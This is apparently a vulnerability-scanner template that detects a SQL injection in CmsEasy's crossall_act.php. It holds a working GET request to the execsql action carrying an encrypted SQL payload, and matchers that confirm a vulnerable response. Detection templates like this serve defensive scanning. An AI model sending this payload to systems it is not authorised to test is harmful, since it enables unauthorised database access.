id: "cmseasy-crossall-sqli"
name: "CmsEasy crossall_act - SQL Injection"
severity: "high"
description: "CmsEasy crossall_act.php SQL Injection Vulnerability. CmsEasy has a SQL injection vulnerability. Any SQL command can be executed by encrypting the SQL statement in the file service.php."
tech:
  - "generic"
tags:
  - "cmseasy"
  - "sqli"
  - "vuln"
reference: "https://cn-sec.com/archives/1580677.html"
spaExclusion: true
request:
  method: "GET"
  path: "/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "{\"123\":\"123\"}"
  - type: "status"
    status:
      - 200
